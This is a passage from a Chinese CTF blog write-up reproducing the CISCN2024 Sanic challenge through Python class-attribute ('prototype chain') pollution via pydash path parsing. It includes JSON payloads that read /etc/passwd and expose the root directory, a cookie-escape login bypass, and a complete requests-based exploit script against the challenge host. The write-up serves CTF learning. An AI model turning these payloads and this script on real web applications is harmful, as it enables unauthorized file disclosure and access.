+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">def</span> <span class="token function">update_with</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> path<span class="token punctuation">,</span> updater<span class="token punctuation">,</span> customizer<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># noqa: C901</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">callable</span><span class="token punctuation">(</span>updater<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        updater <span class="token operator">=</span> pyd<span class="token punctuation">.</span>constant<span class="token punctuation">(</span>updater<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">if</span> customizer <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">and</span> <span class="token keyword">not</span> <span class="token builtin">callable</span><span class="token punctuation">(</span>customizer<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        call_customizer <span class="token operator">=</span> partial<span class="token punctuation">(</span>callit<span class="token punctuation">,</span> clone<span class="token punctuation">,</span> customizer<span class="token punctuation">,</span> argcount<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">elif</span> customizer<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        call_customizer <span class="token operator">=</span> partial<span class="token punctuation">(</span>callit<span class="token punctuation">,</span> customizer<span class="token punctuation">,</span> argcount<span class="token operator">=</span>getargcount<span class="token punctuation">(</span>customizer<span class="token punctuation">,</span> maxargs<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        call_customizer <span class="token operator">=</span> <span class="token boolean">None</span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>    default_type <span class="token operator">=</span> <span class="token builtin">dict</span> <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token builtin">dict</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token builtin">list</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    tokens <span class="token operator">=</span> to_path_tokens<span class="token punctuation">(</span>path<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token keyword">if</span> <span class="token keyword">not</span> pyd<span class="token punctuation">.</span>is_list<span class="token punctuation">(</span>tokens<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># pragma: no cover</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        tokens <span class="token operator">=</span> <span class="token punctuation">[</span>tokens<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre>    last_key <span class="token operator">=</span> pyd<span class="token punctuation">.</span>last<span class="token punctuation">(</span>tokens<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>last_key<span class="token punctuation">,</span> PathToken<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        last_key <span class="token operator">=</span> last_key<span class="token punctuation">.</span>key</pre></td></tr><tr><td data-num="22"></td><td><pre></pre></td></tr><tr><td data-num="23"></td><td><pre>    target <span class="token operator">=</span> obj</pre></td></tr><tr><td data-num="24"></td><td><pre></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token keyword">for</span> idx<span class="token punctuation">,</span> token <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>pyd<span class="token punctuation">.</span>initial<span class="token punctuation">(</span>tokens<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> PathToken<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="27"></td><td><pre>            key <span class="token operator">=</span> token<span class="token punctuation">.</span>key</pre></td></tr><tr><td data-num="28"></td><td><pre>            default_factory <span class="token operator">=</span> pyd<span class="token punctuation">.</span>get<span class="token punctuation">(</span>tokens<span class="token punctuation">,</span> <span class="token punctuation">[</span>idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"default_factory"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> default<span class="token operator">=</span>default_type<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre>        <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="30"></td><td><pre>            key <span class="token operator">=</span> token</pre></td></tr><tr><td data-num="31"></td><td><pre>            default_factory <span class="token operator">=</span> default_type</pre></td></tr><tr><td data-num="32"></td><td><pre></pre></td></tr><tr><td data-num="33"></td><td><pre>        obj_val <span class="token operator">=</span> base_get<span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="34"></td><td><pre>        path_obj <span class="token operator">=</span> <span class="token boolean">None</span></pre></td></tr><tr><td data-num="35"></td><td><pre></pre></td></tr><tr><td data-num="36"></td><td><pre>        <span class="token keyword">if</span> call_customizer<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="37"></td><td><pre>            path_obj <span class="token operator">=</span> call_customizer<span class="token punctuation">(</span>obj_val<span class="token punctuation">,</span> key<span class="token punctuation">,</span> target<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="38"></td><td><pre></pre></td></tr><tr><td data-num="39"></td><td><pre>        <span class="token keyword">if</span> path_obj <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="40"></td><td><pre>            path_obj <span class="token operator">=</span> default_factory<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="41"></td><td><pre></pre></td></tr><tr><td data-num="42"></td><td><pre>        base_set<span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">,</span> path_obj<span class="token punctuation">,</span> allow_override<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="43"></td><td><pre></pre></td></tr><tr><td data-num="44"></td><td><pre>        <span class="token keyword">try</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="45"></td><td><pre>            target <span class="token operator">=</span> base_get<span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="46"></td><td><pre>        <span class="token keyword">except</span> TypeError <span class="token keyword">as</span> exc<span class="token punctuation">:</span>  <span class="token comment"># pragma: no cover</span></pre></td></tr><tr><td data-num="47"></td><td><pre>            <span class="token keyword">try</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="48"></td><td><pre>                target <span class="token operator">=</span> target<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="49"></td><td><pre>                _failed <span class="token operator">=</span> <span class="token boolean">False</span></pre></td></tr><tr><td data-num="50"></td><td><pre>            <span class="token keyword">except</span> Exception<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="51"></td><td><pre>                _failed <span class="token operator">=</span> <span class="token boolean">True</span></pre></td></tr><tr><td data-num="52"></td><td><pre></pre></td></tr><tr><td data-num="53"></td><td><pre>            <span class="token keyword">if</span> _failed<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="54"></td><td><pre>                <span class="token keyword">raise</span> TypeError<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Unable to update object at index </span><span class="token interpolation"><span class="token punctuation">&#123;</span>key<span class="token conversion-option punctuation">!r</span><span class="token punctuation">&#125;</span></span><span class="token string">. </span><span class="token interpolation"><span class="token punctuation">&#123;</span>exc<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="55"></td><td><pre></pre></td></tr><tr><td data-num="56"></td><td><pre>    value <span class="token operator">=</span> base_get<span class="token punctuation">(</span>target<span class="token punctuation">,</span> last_key<span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="57"></td><td><pre>    base_set<span class="token punctuation">(</span>target<span class="token punctuation">,</span> last_key<span class="token punctuation">,</span> callit<span class="token punctuation">(</span>updater<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="58"></td><td><pre></pre></td></tr><tr><td data-num="59"></td><td><pre>    <span class="token keyword">return</span> obj</pre></td></tr></table></figure><p>跟 tokens = to_path_tokens (path) 到：</p>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">def</span> <span class="token function">to_path_tokens</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token triple-quoted-string string">"""Parse `value` into :class:`PathToken` objects."""</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">if</span> pyd<span class="token punctuation">.</span>is_string<span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token punctuation">(</span><span class="token string">"."</span> <span class="token keyword">in</span> value <span class="token keyword">or</span> <span class="token string">"["</span> <span class="token keyword">in</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        <span class="token comment"># Since we can't tell whether a bare number is supposed to be dict key or a list index, we</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token comment"># support a special syntax where any string-integer surrounded by brackets is treated as a</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token comment"># list index and converted to an integer.</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        keys <span class="token operator">=</span> <span class="token punctuation">[</span></pre></td></tr><tr><td data-num="8"></td><td><pre>            PathToken<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> default_factory<span class="token operator">=</span><span class="token builtin">list</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>            <span class="token keyword">if</span> RE_PATH_LIST_INDEX<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>            <span class="token keyword">else</span> PathToken<span class="token punctuation">(</span>unescape_path_key<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> default_factory<span class="token operator">=</span><span class="token builtin">dict</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>            <span class="token keyword">for</span> key <span class="token keyword">in</span> <span class="token builtin">filter</span><span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> RE_PATH_KEY_DELIM<span class="token punctuation">.</span>split<span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token punctuation">]</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token keyword">elif</span> pyd<span class="token punctuation">.</span>is_string<span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token keyword">or</span> pyd<span class="token punctuation">.</span>is_number<span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        keys <span class="token operator">=</span> <span class="token punctuation">[</span>PathToken<span class="token punctuation">(</span>value<span class="token punctuation">,</span> default_factory<span class="token operator">=</span><span class="token builtin">dict</span><span class="token punctuation">)</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token keyword">elif</span> value <span class="token keyword">is</span> UNSET<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        keys <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        keys <span class="token operator">=</span> value</pre></td></tr><tr><td data-num="19"></td><td><pre></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token keyword">return</span> keys</pre></td></tr></table></figure><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>RE_PATH_KEY_DELIM <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r"(?&lt;!\)(?:\\)*.|([\d+])"</span><span class="token punctuation">)</span></pre></td></tr></table></figure><pre><code>发现\.会当作.进行处理，可以绕过题目的过滤，而.会作为.的转义不进行分割
+__init__\\\.__globals__
+等于
+__init__\\.__globals__
+等于
+__init__.__globals__
+</code></pre>
+<p>所以用这 payload 读文件：</p>
+<pre><code>&#123;&quot;key&quot;:&quot;__class__\\\\.__init__\\\\.__globals__\\\\.__file__&quot;,&quot;value&quot;:&quot;/etc/passwd&quot;&#125;  //24bcbd0192e591d6ded1_flag
+</code></pre>
+<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202505151637773.png" alt="image-20250515163721593" /></p>
+<p>污染成功，但是不知道 flag 的文件名，注意到注册的 static 路由会添加 DirectoryHandler 到 route</p>
+<p>跟进 static</p>
+<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202505151641482.png" alt="image-20250515164121386" /></p>
+<p>给了注释，可以翻译一下</p>
+<pre><code>directory_view(bool,optional):这是一个可选的布尔函数，用于决定当暴露一个目录是是否先是目录结构给用户，耳式按照其他预设方式处理目录访问亲环球，当设置为True，用户界面或API相应可能会改为先是目录的内容列表，类似于你在文件浏览器中看到的文件和子目录列表。
+
+directory_handler(Optional[DirectoryHandler],optional):这是一个更高级的配置选项，允许你提供一个自定义的DirectoryHandler实例.DirevotoryHandler是一个类或接口，定义了如何处理目录请求的具体行为，通过传入一个自定义的DirectortHandler实例，你可以控制和扩展应用程序处理目录时的默认行为。这包括但不小于权限控制，目录遍历逻辑，文件预览或其他任何自定义逻辑。Optional意味着这个参数是可以忽略的，如果不提供，默认的目录处理逻辑将会被使用。
+</code></pre>
+<p>大概就是当 directory_view 为 True 时，会开启列目录功能，directory_handler 中可以获取指定的目录跟进 directory_handler</p>
+<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202505151754849.png" alt="image-20250515175401704" /></p>
+<p>发现 directory_handler 是对 DirectoryHandler 类的实例化：</p>
+<p>跟进 directory_view 这个</p>
+<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202505151757293.png" alt="image-20250515175720222" /></p>
+<p>跟进这个类发现 directory_view 和 directory 所以只要我们将 directory 污染为根目录，directory_view 污染为 True，就可以看到根目录的所有文件了，这边我们可以开始操作了</p>
+<p>那么就是怎么找到这两个参数了，才能去修改</p>
+<h4 id="修改directory_view"><a class="anchor" href="#修改directory_view">#</a> 修改 directory_view</h4>
+<p>再 sanic 框架中通过 app.route.name_index ['xxxxx'] 来获取注册的路由，我们可以直接输出看一下</p>
+<h5 id="printapproutername_indexkeys"><a class="anchor" href="#printapproutername_indexkeys">#</a> print(app.router.name_index.keys())</h5>
+<p>但是我们发现没有找到这个路由的名字 name，那么我们可以通过 print (app.router.name_index.keys ()) 这条命令找到这些路由的默认名字</p>
+<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202505151838159.png" alt="image-20250515183809043" /></p>
+<pre><code>还能用
+
+#### print(app.router.name_index['__mp_main__.static'])
+</code></pre>
+<p>然后就是得找到哪里能找到调用到 DirectoryHandler 里呢？</p>
+<p>我们可以全局搜索一下在哪里有调用这个 name_index 方法</p>
+<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202505152051169.png" alt="image-20250515205148896" /></p>
+<p>找到这个方法给个断点</p>
+<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202505152053132.png" alt="image-20250515205326960" /></p>
+<p>找到这个 directory_view 的属性，可以</p>
+<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202505152056755.png" alt="image-20250515205614631" /></p>
+<p>找到这个属性了，就可以直接将其设置值了</p>
+<figure class="highlight json"><figcaption data-lang="JSON"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">&#123;</span><span class="token property">"key"</span><span class="token operator">:</span><span class="token string">"__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view"</span><span class="token punctuation">,</span><span class="token property">"value"</span><span class="token operator">:</span> <span class="token string">"True"</span><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>注意这里不能用 [] 来包裹其中的索引，污染和直接调用不同，我们需要用。来连接，而</p>
+<pre><code>__mp_main.static
+</code></pre>
+<p>是一个整体，不能分开，我们可以用两个反斜杠来转义就够了</p>
+<p>可以看到是污染成功了，访问 /static/，可以看到该目录下的文件</p>
+<h4 id="修改directory的值"><a class="anchor" href="#修改directory的值">#</a> 修改 directory 的值</h4>
+<p>接下来就是设置 directory 就够了，我们先获取他的值</p>
+<figure class="highlight json"><figcaption data-lang="JSON"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">&#123;</span><span class="token property">"key"</span><span class="token operator">:</span><span class="token string">"__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory"</span><span class="token punctuation">,</span><span class="token property">"value"</span><span class="token operator">:</span> <span class="token string">"True"</span><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>但是发现在我 /static/ 时候确实 500 错误</p>
+<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202505152141080.png" alt="image-20250515214158892" /></p>
+<p>发现这里的值不能进行字符串的赋值，</p>
+<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202505152143496.png" alt="image-20250515214304245" /></p>
+<p>回到原地就是</p>
+<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202505152143086.png" alt="image-20250515214357002" /></p>
+<p>发现是 parts 的值是 directory 的值</p>
+<p>我可以找到他的源码，看看它是怎么赋值的，或者直接本地调试是什么类型的</p>
+<p>本地的环境好像找不到_parts 这东西了，(可能版本太高了)</p>
+<pre><code>http://127.0.0.1:8000/src?cmd=print(app.router.name_index['__mp_main__.static'].handler.keywords['directory_handler'].directory._parts)
+</code></pre>
+<p>会报错</p>
+<p>那就看一下别人的复现吧</p>
+<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202505152204894.png" alt="image-20250515220457721" /></p>
+<p>可以看到这里是获取一个 Path 对象我们跟进 Path 对象里</p>
+<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202505152205379.png" alt="image-20250515220515187" /></p>
+<p>可以看到 parts 的值最后是给了_parts 这个属性，我们访问这个属性看看:</p>
+<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202505152205543.png" alt="image-20250515220530355" /></p>
+<p>看到这是一个 list, 那么这里很明显我们就可以直接污染了</p>
+<p>到此，我们两个污染点的污染链都已经明确，下面给出 paylaod:</p>
+<pre><code>#开启列目录功能
+&#123;&quot;key&quot;:&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;,&quot;value&quot;: true&#125;
+#将目录设置在根目录下&#123;&quot;key&quot;:&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts&quot;,&quot;value&quot;: [&quot;/&quot;]&#125;
+</code></pre>
+<p>至此，就可以直接打了。（呜呜呜呜呜，终于能复现一个国赛的 web 题了）</p>
+<p>exp:</p>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>base <span class="token operator">=</span> <span class="token string">'http://a78602e2-d016-4f57-8017-f29321897c8b.challenge.ctf.show'</span></pre></td></tr><tr><td data-num="4"></td><td><pre>s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>s<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token string">'user'</span><span class="token punctuation">:</span> <span class="token string">'"adm\\073n"'</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>base <span class="token operator">+</span> <span class="token string">'/login'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token string">"key"</span><span class="token punctuation">:</span> <span class="token string">"__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token string">"value"</span><span class="token punctuation">:</span> <span class="token string">"true"</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>data1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token string">"key"</span><span class="token punctuation">:</span> <span class="token string">"__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token string">"value"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"/"</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre>r <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>base <span class="token operator">+</span> <span class="token string">'/admin'</span><span class="token punctuation">,</span> json<span class="token operator">=</span>data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre>r <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>base <span class="token operator">+</span> <span class="token string">'/admin'</span><span class="token punctuation">,</span> json<span class="token operator">=</span>data1<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span></pre></td></tr></table></figure><p>参考链接：<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vZ3huZ3huZ3huL3AvMTgyMDUyMzU=">CISCN2024-WEB-Sanic gxngxngxn - gxngxngxn - 博客园</span></p>
+<p><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL25ld3MvMTQwNTc=">从 CISCN2024 的 sanic 引发对 python “原型链” 的污染挖掘 - 先知社区</span></p>
+
+      <div class="tags">
+          <a href="/tags/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" rel="tag"><i class="ic i-tag"></i> python原型链污染</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">Edited on</span>
+    <time title="Modified: 2025-05-15 22:16:32" itemprop="dateModified" datetime="2025-05-15T22:16:32+08:00">2025-05-15</time>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> Donate</button>
+  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt="odiws WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt="odiws Alipay">
+        <p>Alipay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/paypal.png" alt="odiws PayPal">
+        <p>PayPal</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>Post author:  </strong>odiws <i class="ic i-at"><em>@</em></i>Hexo
+  </li>
+  <li class="link">
+    <strong>Post link: </strong>
+    <a href="http://odiws.github.io/2025/05/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" title="python原型链污染">http://odiws.github.io/2025/05/14/python原型链污染/</a>
+  </li>
+  <li class="license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2025/05/06/SWPU2019-%E4%BC%9F%E5%A4%A7%E7%9A%84%E4%BE%A6%E6%8E%A2/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;www.loliapi.com&#x2F;acg&#x2F;?911369" title="[SWPU2019]伟大的侦探">
+  <span class="type">Previous Post</span>
+  <span class="category"><i class="ic i-flag"></i> misc</span>
+  <h3>[SWPU2019]伟大的侦探</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+      
+
+  <a href="/2025/05/21/SWPU2019-%E4%BD%A0%E6%9C%89%E6%B2%A1%E6%9C%89%E5%A5%BD%E5%A5%BD%E7%9C%8B%E7%BD%91%E8%AF%BE/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;www.loliapi.com&#x2F;acg&#x2F;?829745" title="[SWPU2019]你有没有好好看网课?">
+  <span class="type">Next Post</span>
+  <span class="category"><i class="ic i-flag"></i> misc</span>
+  <h3>[SWPU2019]你有没有好好看网课?</h3>
+  </a>
+
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="Contents">
+          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">1.</span> <span class="toc-text"> python 原型链污染</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#py%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text"> py 原型链污染基础原理：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.2.</span> <span class="toc-text"> </span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%85%B3%E9%94%AE%E4%BF%A1%E6%81%AF%E6%9B%BF%E6%8D%A2"><span class="toc-number">1.3.</span> <span class="toc-text"> 利用：关键信息替换</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#flask%E5%AF%86%E9%92%A5%E6%9B%BF%E6%8D%A2"><span class="toc-number">1.3.1.</span> <span class="toc-text"> flask 密钥替换：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#_got_first_request"><span class="toc-number">1.3.2.</span> <span class="toc-text"> _got_first_request:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#_static_url_path"><span class="toc-number">1.3.3.</span> <span class="toc-text"> _static_url_path:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ospathpardir"><span class="toc-number">1.3.4.</span> <span class="toc-text"> os.path.pardir:</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90"><span class="toc-number">1.4.</span> <span class="toc-text"> 题目解析</span></a><ol class="toc-child"><li 